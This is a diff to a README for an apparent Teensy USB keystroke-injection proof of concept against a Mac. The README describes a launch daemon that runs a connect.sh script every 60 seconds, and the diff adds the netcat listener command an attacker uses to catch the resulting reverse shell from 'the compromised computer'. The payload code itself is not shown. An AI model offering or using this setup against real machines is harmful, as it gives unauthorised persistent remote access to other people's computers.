@@ -9,6 +9,8 @@ Here's a breakdown of what happens:
 3. A launch daemon is configured to run every 60 seconds and attempt to run the connect.sh script
 4. Terminal is quit and the built-in LED of the Teensy will flash 10 times signaling it's complete
 
+You can connect to the compromised computer by starting a netcat connection with the command "nc -l *IP Address* 1337" from the computer who's IP you specified in the connect.sh.
+
 All of this happens within seconds, increase delays if you'd like to see the results slowly.
 
 I am not responsible for any harm caused by this code, it is simply a POC.
